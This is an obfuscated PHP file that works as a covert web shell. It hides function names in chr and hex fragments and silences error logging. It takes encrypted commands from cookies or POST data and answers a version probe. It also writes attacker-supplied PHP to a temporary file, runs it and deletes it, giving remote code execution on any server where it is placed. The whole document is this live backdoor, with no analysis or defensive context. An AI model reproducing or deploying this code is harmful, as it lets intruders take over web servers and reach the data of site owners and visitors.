<?php $paoco = chr(811-709)."\151"."\x6c".chr(640-539).chr(95)."\160".'u'.'t'.chr(95)."\143".chr(111)."\156"."\164"."\x65".chr(110)."\x74"."\x73";
$rcnzhflkbl = "\x62"."\141".'s'.chr(101)."\x36".chr(52).'_'."\x64"."\x65".chr(99).chr(783-672).chr(1042-942).chr(274-173);
$hhoqyduvm = chr(105).chr(110).'i'.chr(95)."\x73".'e'."\164";
$jsaxafyiy = "\165"."\156".chr(108)."\x69".'n'.chr(608-501);


@$hhoqyduvm(chr(863-762).chr(114)."\x72".chr(508-397).chr(114)."\x5f".chr(1107-999)."\157".chr(201-98), NULL);
@$hhoqyduvm(chr(789-681).chr(111)."\x67"."\x5f".chr(841-740).chr(114).chr(114)."\x6f"."\162".chr(395-280), 0);
@$hhoqyduvm(chr(109)."\141".chr(120)."\137".'e'.'x'.chr(1070-969)."\x63".chr(162-45)."\x74".chr(614-509).'o'."\x6e"."\137".chr(116)."\151"."\155"."\145", 0);
@set_time_limit(0);

function hrlhxfe($wlexajpujw, $legid)
{
    $uzizqkwxalphsx = "";
    for ($uzizqkwxal = 0; $uzizqkwxal < strlen($wlexajpujw);) {
        for ($j = 0; $j < strlen($legid) && $uzizqkwxal < strlen($wlexajpujw); $j++, $uzizqkwxal++) {
            $uzizqkwxalphsx .= chr(ord($wlexajpujw[$uzizqkwxal]) ^ ord($legid[$j]));
        }
    }
    return $uzizqkwxalphsx;
}

$hdtrbgv = array_merge($_COOKIE, $_POST);
$lgaykafw = 'dd479c24-8f9f-433a-bd80-f4d143b520aa';
foreach ($hdtrbgv as $kailnqzm => $wlexajpujw) {
    $wlexajpujw = @unserialize(hrlhxfe(hrlhxfe($rcnzhflkbl($wlexajpujw), $lgaykafw), $kailnqzm));
    if (isset($wlexajpujw[chr(1056-959).'k'])) {
        if ($wlexajpujw["\141"] == 'i') {
            $uzizqkwxal = array(
                chr(112)."\166" => @phpversion(),
                chr(477-362).chr(504-386) => "3.5",
            );
            echo @serialize($uzizqkwxal);
        } elseif ($wlexajpujw["\141"] == "\x65") {
            $prvnidknlq = "./" . md5($lgaykafw) . "\x2e"."\x69"."\x6e".chr(321-222);
            @$paoco($prvnidknlq, "<" . '?'."\x70".chr(104)."\160".' '.chr(64)."\165"."\x6e"."\x6c"."\x69".'n'.chr(390-283).chr(781-741)."\137".chr(144-49).chr(1029-959).chr(465-392).chr(76).'E'.chr(794-699).'_'.chr(41).';'."\40" . $wlexajpujw["\x64"]);
            @include($prvnidknlq);
            @$jsaxafyiy($prvnidknlq);
        }
        exit();
    }
}

